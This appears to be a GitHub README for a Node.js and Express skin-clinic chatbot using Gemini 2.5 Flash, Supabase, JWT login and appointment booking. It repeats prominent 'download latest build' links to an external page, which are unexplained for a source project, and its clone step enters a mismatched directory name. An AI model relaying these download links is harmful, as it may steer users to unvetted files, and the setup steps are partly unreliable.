# Lumiere Skin Clinic AI Chatbot - AI Clinic Chatbot 2026

> **Lumiere Skin Clinic AI Chatbot is a browser-based clinic assistant powered by Google Gemini 2.5 Flash, with appointment scheduling and live availability checks.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/cooperjordanyl4007/lumiere-ai-clinic-chat?style=flat-square)](https://github.com/cooperjordanyl4007/lumiere-ai-clinic-chat)

---

<p align="center">
  <a href="https://cooperjordanyl4007.github.io/lumiere-ai-clinic-chat/">
    <img src="https://img.shields.io/badge/Download-Lumiere%20Skin%20Clinic%20AI%20Chatbot%20Latest-brightgreen?style=for-the-badge" alt="Download Lumiere Skin Clinic AI Chatbot">
  </a>
</p>

> **[Download the latest Lumiere Skin Clinic AI Chatbot build](https://cooperjordanyl4007.github.io/lumiere-ai-clinic-chat/)**

---

[Download Latest Build](https://cooperjordanyl4007.github.io/lumiere-ai-clinic-chat/)

---

## What the Application Does

Lumiere Skin Clinic AI Chatbot provides clinic visitors with an online conversational assistant and appointment management experience. Google Gemini 2.5 Flash handles the AI dialogue, while the responsive static frontend lets users ask clinic-related questions and inspect current booking availability from a browser.

Appointment requests can be submitted by guests or signed-in users. Supabase PostgreSQL is used for account and chat data, and the application includes JWT authentication, safeguards against booking conflicts, request rate limits, and daily message limits for standard clinic operations.

---

## Core Capabilities

- Conversational clinic assistance through Google Gemini 2.5 Flash
- Appointment scheduling available to guests and registered users
- Live appointment-slot availability checks
- Account creation secured with JWT authentication
- Chat history persistence using Supabase PostgreSQL
- Protection against conflicting appointment bookings
- Request throttling and per-day message limits
- Thai timezone support with UTC handling for appointments
- Responsive interface for desktop and mobile browsers
- Node.js and Express-based application structure

---

## Getting Started

### Retrieve the source

```bash
git clone https://github.com/cooperjordanyl4007/lumiere-ai-clinic-chat.git
cd ai-chat-bot-clinic
```

### Set up packages

Install the project dependencies with npm:

```bash
npm install
```

### Add environment settings

Create an environment file containing the Gemini, Supabase, authentication, and server configuration required by the application.

```bash
cp .env.example .env
```

Edit `.env` with the appropriate values and launch the development server:

```bash
npm run dev
```

When no development script is defined, run the start script declared in `package.json` instead:

```bash
npm start
```

After the server starts, visit the local URL printed in the terminal.

---

## Using the Chatbot

1. Load the web application in a browser.
2. Begin a conversation about the clinic with the AI assistant.
3. Check the appointment times currently offered.
4. Book as a guest, or create an account and sign in to use the authenticated flow.
5. Choose an open slot and send the appointment request.
6. Reopen the chat area whenever you need to view stored conversation history.

Appointment timezone behavior follows Thai timezone support, with UTC storage or processing where the application configuration enables it.

---

## Environment Configuration

The application reads its settings from environment variables. Refer to `.env.example` in the repository for the definitive variable names.

The main configuration categories commonly include:

```env
GEMINI_API_KEY=your_gemini_api_key
SUPABASE_URL=your_supabase_project_url
SUPABASE_ANON_KEY=your_supabase_key
JWT_SECRET=your_jwt_secret
PORT=3000
```

Do not commit secrets to the repository. For production, provide the required values through your hosting provider's environment configuration, including services such as Vercel or Render.

---

## System Requirements

- Current web browser
- Node.js with npm
- Google Gemini API access for chatbot responses
- Supabase project with PostgreSQL database access
- Environment variables covering the database, authentication, and server settings
- Network connectivity to the application and its configured services

The project is suitable for Node.js-compatible hosting providers, including Vercel and Render, subject to the deployment configuration included with the project.

---

## Common Questions

### Is a Gemini API key needed?

Yes. The clinic assistant relies on Google Gemini 2.5 Flash for AI conversations, so valid Gemini credentials must be supplied through the application environment.

### Can someone schedule an appointment as a guest?

Yes. Both guest and authenticated booking are supported. The required information and exact booking steps may vary according to the deployed configuration.

### What service keeps the chat history?

Chat history is persisted through the project's Supabase PostgreSQL integration.

### Which timezone is used for appointments?

The application supports Thai timezone handling and UTC-based appointment processing. Before using the system for clinic operations, verify the timezone configuration of the deployed environment.

### What should I inspect when startup fails?

First confirm that dependencies were installed and all required environment variables are available. Then check the Supabase values and ensure the npm command matches a script defined in `package.json`.

### What is the deployment update process?

Fetch the newest repository changes, reinstall packages if needed, review the deployment environment variables, and redeploy through the configured Vercel or Render project.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
